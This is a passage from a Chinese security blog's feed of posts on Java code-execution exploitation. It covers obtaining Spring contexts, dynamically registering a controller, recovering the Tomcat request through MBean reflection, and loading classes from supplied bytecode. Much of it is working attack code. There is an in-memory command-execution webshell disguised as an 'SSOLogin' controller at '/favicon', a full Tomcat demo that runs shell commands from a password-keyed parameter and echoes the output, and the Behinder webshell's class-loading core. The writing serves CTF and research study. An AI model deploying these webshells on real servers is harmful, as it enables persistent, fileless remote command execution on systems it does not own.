<h5 id="WebApplicationContextUtils-getWebApplicationContext"><a href="#WebApplicationContextUtils-getWebApplicationContext" class="headerlink" title="WebApplicationContextUtils.getWebApplicationContext"></a>WebApplicationContextUtils.getWebApplicationContext</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest().getServletContext();</span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(servletContext);</span><br></pre></td></tr></table></figure>

<p>在跟踪Child Context创建过程时，其中就用到getWebApplicationContext，其借助servletContext获取Root Context</p>
<h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a>getAttribute</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest().getServletContext();</span><br><span class="line">WebApplicationContext context = (WebApplicationContext) servletContext.getAttribute(&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;);</span><br></pre></td></tr></table></figure>

<p>所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中</p>
<h4 id="获取Child-Context"><a href="#获取Child-Context" class="headerlink" title="获取Child Context"></a>获取Child Context</h4><h5 id="getAttribute-1"><a href="#getAttribute-1" class="headerlink" title="getAttribute"></a>getAttribute</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>前文已经提到Child Context作为一个属性存入了request（从ServletContext获取也可）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>getAttribute 参数中的 0代表从当前 request 中获取而不是从当前的 session 中获取属性值</p>
<h5 id="RequestContextUtils-findWebApplicationContext"><a href="#RequestContextUtils-findWebApplicationContext" class="headerlink" title="RequestContextUtils.findWebApplicationContext"></a>RequestContextUtils.findWebApplicationContext</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest();</span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(request);</span><br><span class="line"></span><br><span class="line"><span class="comment">//RequestContextUtils.getWebApplicationContext(request);</span></span><br></pre></td></tr></table></figure>

<p>参考文章中是使用RequestContextUtils.getWebApplicationContext，在较新spring版本中已经没有该方法了</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>根据习惯，在很多应用配置中注册Controller 的 component-scan 组件都配置在类似的 dispatcherServlet-servlet.xml 中，而不是全局配置文件 applicationContext.xml 中，这样就导致 RequestMappingHandlerMapping 的实例 bean 只存在于 Child WebApplicationContext 环境中，另外，在有些Spring 应用逻辑比较简单的情况下，可能没有配置 ContextLoaderListener 、也没有类似 applicationContext.xml 的全局配置文件，只有简单的 servlet 配置文件</p>
<p>由于Root Context无法访问Child Context中定义的 bean，反之可以，所以最好使用采用获取Child Context的方法</p>
<h3 id="动态注册Controller"><a href="#动态注册Controller" class="headerlink" title="动态注册Controller"></a>动态注册Controller</h3><p>由于版本不同和较多的接口等原因，程序的上下文中存在不同映射器的实例 bean，动态注册controller的方法也有多种</p>
<h4 id="BeanNameUrlHandlerMapping"><a href="#BeanNameUrlHandlerMapping" class="headerlink" title="BeanNameUrlHandlerMapping"></a>BeanNameUrlHandlerMapping</h4><p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200407231414555.png" alt="image-20200407231414555"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SSOLogin</span> <span class="keyword">implements</span> <span class="title class_">Controller</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> httpServletResponse.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                httpServletResponse.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">XmlWebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (XmlWebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;/SSOLogin&quot;</span>,<span class="keyword">new</span> <span class="title class_">SSOLogin</span>());</span><br><span class="line">BeanNameUrlHandlerMapping beanNameUrlHandlerMapping=context.getBean(BeanNameUrlHandlerMapping.class);</span><br><span class="line">Method detectHandlersMethod=Class.forName(<span class="string">&quot;org.springframework.web.servlet.handler.AbstractDetectingUrlHandlerMapping&quot;</span>).getDeclaredMethod(<span class="string">&quot;detectHandlers&quot;</span>);</span><br><span class="line">detectHandlersMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">detectHandlersMethod.invoke(beanNameUrlHandlerMapping);</span><br></pre></td></tr></table></figure>



<h4 id="DefaultAnnotationHandlerMapping"><a href="#DefaultAnnotationHandlerMapping" class="headerlink" title="DefaultAnnotationHandlerMapping"></a>DefaultAnnotationHandlerMapping</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">XmlWebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (XmlWebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>,<span class="keyword">new</span> <span class="title class_">SSOLogin</span>());</span><br><span class="line"><span class="comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.<span class="type">DefaultAnnotationHandlerMapping</span>  <span class="variable">dh</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br><span class="line"><span class="comment">// 3. 反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="string">&quot;registerHandler&quot;</span>, String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">&quot;/favicon&quot;</span>, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="基于MBeanServer获取Tomcat-Response"><a href="#基于MBeanServer获取Tomcat-Response" class="headerlink" title="基于MBeanServer获取Tomcat Response"></a>基于MBeanServer获取Tomcat Response</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="#%E5%AF%BB%E6%89%BETomcat-Response-1">前文</a>提到当前的processor存储在了global中，往下读代码的话会发现，也注册为了组件，那么再从其中拿出即可</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409162848538.png" alt="image-20200409162848538"></p>
<p>一开始起的spring-boot项目测试，发现获取的MBeanServer为NoJmxMBeanServer</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409163920419.png" alt="image-20200409163920419"></p>
<p>查阅文档发现是用于禁用MBean注册</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409164108273.png" alt="image-20200409164108273"></p>
<p>然后继续调试源码发现springboot默认就是禁用了MBeanRegistry</p>
<p>org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409163753853.png" alt="image-20200409163753853"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409163814140.png" alt="image-20200409163814140"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409163839488.png" alt="image-20200409163839488"></p>
<p>起一个普通的servlet测试，如果要跟踪Tomcat内部源码，pom.xml写入对应版本Tomcat</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.51<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-coyote<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.91<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>最后由<a href="https://xz.aliyun.com/t/7535">参考文章</a>给出的获取方法找到对应的processor中的req</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409170643469.png" alt="image-20200409170643469"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409170758221.png" alt="image-20200409170758221"></p>
<p>Tomcat7，8不同在于这里的MBean的name</p>
<p>Tomcat8在linux下默认为nio，8080对应服务端口，Tomcat7或以下，在Linux系统中默认使用bio</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200409171807672.png" alt="image-20200409171807672"></p>
<p>参考文章中tomcat7和8分别用了两个poc来解决nio和bio的差异，但是感觉有点麻烦，而且如果Tomcat在反代之后，那么端口也是不确定的，所以想尝试动态获取这两点，后来在<a href="https://blog.csdn.net/weixin_34204722/article/details/88598212">这里</a>找到方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer().queryNames(<span class="keyword">new</span> <span class="title class_">ObjectName</span>(<span class="string">&quot;Catalina:type=GlobalRequestProcessor,name=*http*&quot;</span>),<span class="literal">null</span>).iterator().next().toString();</span><br><span class="line">Matcher matcher=Pattern.compile(<span class="string">&quot;Catalina:(type=.*),(name=.*)&quot;</span>).matcher(name);</span><br><span class="line"><span class="keyword">if</span>(matcher.find()) name = matcher.group(<span class="number">2</span>)+<span class="string">&quot;,&quot;</span>+matcher.group(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h3 id="完整Demo-1"><a href="#完整Demo-1" class="headerlink" title="完整Demo"></a>完整Demo</h3><p>和之前一样，需要从processors筛选当前的，为了方便我依然用的QueryString</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> Registry.getRegistry(<span class="literal">null</span>,<span class="literal">null</span>).getMBeanServer();</span><br><span class="line"></span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> mbeanServer.queryNames(<span class="keyword">new</span> <span class="title class_">ObjectName</span>(<span class="string">&quot;Catalina:type=GlobalRequestProcessor,name=*http*&quot;</span>),<span class="literal">null</span>).iterator().next().toString();</span><br><span class="line">	Matcher matcher=Pattern.compile(<span class="string">&quot;Catalina:(type=.*),(name=.*)&quot;</span>).matcher(name);</span><br><span class="line">	<span class="keyword">if</span>(matcher.find()) name = matcher.group(<span class="number">2</span>)+<span class="string">&quot;,&quot;</span>+matcher.group(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">	field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">	field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">	field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">	field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">	field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">HashMap</span> <span class="variable">obj2</span> <span class="operator">=</span> (HashMap)field.get(obj);</span><br><span class="line">	obj = ((HashMap)obj2.get(<span class="string">&quot;Catalina&quot;</span>)).get(name);</span><br><span class="line"></span><br><span class="line">	field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">	field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">	field = Class.forName(<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">	field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">	field = Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">	field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">ArrayList</span> <span class="variable">obj3</span> <span class="operator">=</span> (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">	String pass=<span class="string">&quot;cmd12138&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; obj3.size(); k++) &#123;</span><br><span class="line">		org.apache.coyote.<span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestInfo) obj3.get(k);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (requestInfo.getCurrentQueryString()!=<span class="literal">null</span> &amp;&amp; requestInfo.getCurrentQueryString().contains(pass)) &#123;</span><br><span class="line">			java.lang.reflect.<span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> org.apache.coyote.RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">			requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">			org.apache.coyote.<span class="type">Request</span> <span class="variable">tempRequest</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line">			org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			<span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(pass);</span><br><span class="line">			String[] cmds = !System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">			java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">			java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">			<span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">			java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">			java.lang.reflect.<span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> request.getResponse().getClass().getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);</span><br><span class="line">			usingWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">			usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">			writer.write(output);</span><br><span class="line">			writer.flush();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台</a></p>
<p><a href="https://xz.aliyun.com/t/7307">linux下java反序列化通杀回显方法的低配版实现</a></p>
<p><a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a></p>
<p><a href="https://www.cnblogs.com/noKing/p/9038234.html">Java反射-修改字段值, 反射修改static final修饰的字段</a></p>
<p><a href="https://jingyan.baidu.com/article/47a29f249afdbbc014239994.html">在idea中如何debug跟踪到tomcat内部代码</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>
<p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-classloader/">深入探讨 Java 类加载器</a></p>
<p><a href="https://www.iteye.com/blog/tyrion-1958814">走出类加载器迷宫</a></p>
<p><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a></p>
<p><a href="https://www.jianshu.com/p/cbe1c3174d41">动态注册之Servlet+Filter+Listener</a></p>
<p><a href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a></p>
<p><a href="https://www.cnblogs.com/xiaoxi/p/6164383.html">SpringMVC工作原理</a></p>
<p><a href="https://blog.csdn.net/snowy_way/article/details/50164159">ContextLoaderListener（1）—WebApplicationContext创建过程</a></p>
<p><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">基于Tomcat无文件Webshell研究</a></p>
<p><a href="https://xz.aliyun.com/t/7535">tomcat不出网回显连续剧第六集</a></p>
<p><a href="https://blog.csdn.net/ClementAD/article/details/47045673">Tomcat Connector三种运行模式（BIO, NIO, APR）的比较和优化</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/02/18/Hello-World/</url>
    <content><![CDATA[<p>&emsp;&emsp;搭了一下午博客，终于是弄好了。<a href="https://www.cnblogs.com/leixiao-/">以前博客</a>咕了半年，这次不巧遇见疫情，延迟一月开学，想来这个寒假前半部分都在划水（细想甚至这半年也貌似没怎么进步），究其原因还是自己有点浮躁了，但被迫宅家的这段日子发现能找回以前钻研问题那种单纯乐趣与满足，趁着这大好时间，换套系统，开始写写学习笔记，督促督促自己，早日脱离菜鸟行列！</p>
]]></content>
  </entry>
  <entry>
    <title>Java代码执行漏洞中类动态加载的应用</title>
    <url>/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>今年SCTF和另一个师傅一起出了道题，其中环境就是完全不出网的Spring boot + Shiro，要对其进行内网渗透，所以就有了下文的思路，通过改造ysoserial，reGeorg，使用动态加载类的方法，突破header头长度的限制，攻击Shiro并把reGeorg注册为filter，提供代理</p>
<span id="more"></span>

<h2 id="Java类动态加载"><a href="#Java类动态加载" class="headerlink" title="Java类动态加载"></a>Java类动态加载</h2><p>Java中类的加载方式分为显式和隐式，隐式加载是通过<code>new</code>等途径生成的对象时Jvm把相应的类加载到内存中，显示加载是通过<code>Class.forName(..)</code>等方式由程序员自己控制加载，而显式类加载方式也可以理解为类动态加载，我们也可以自定义类加载器去加载任意的类。</p>
<h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，其他子类加载器例如<code>URLClassLoader</code>都是通过继承<code>java.lang.ClassLoader</code>然后重写父类方法从而实现了加载目录class文件或者远程资源文件</p>
<p>在网站管理工具”冰蝎”中用到了这种方法</p>
<p>冰蝎服务端核心代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        <span class="built_in">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(classBytes).newInstance().equals(pageContext);</span><br></pre></td></tr></table></figure>

<p>代码中创建了U类继承ClassLoader，然后自定义一个名为g的方法，接收字节数组类型的参数并调用父类的defineClass动态解析字节码返回Class对象，然后实例化该类并调用equals方法，传入jsp上下文中的pageContext对象。</p>
<p>其中classBytes就是由冰蝎客户端发送至服务端的字节码，该字节码所代表的类中重写了equals方法，从pageContext中提取request，response等对象作参数的获取和执行结果的返回</p>
<h2 id="反射调用defineClass"><a href="#反射调用defineClass" class="headerlink" title="反射调用defineClass"></a>反射调用defineClass</h2><p>上文中新建了一个类来实现动态加载字节码的功能，但在某些利用场景使用有一定限制，所以也可以直接通过反射调用ClassLoader的defineClass方法动态加载字节码而不用新建其他Java类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>()&#123;&#125;, classBytes, <span class="number">0</span>, classBytes.length);</span><br></pre></td></tr></table></figure>

<p>在调用defineClass时，重新实例化了一个ClassLoader，<code>new ClassLoader()&#123;&#125;</code>，这是因为在Java中类的唯一性由类加载器和类本身决定，如果沿用当前上下文中的类加载器实例，而POC中使用同一个类名多次攻击，可能出现类重复定义异常</p>
<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200705130850198.png" alt="image-20200705130850198"></p>
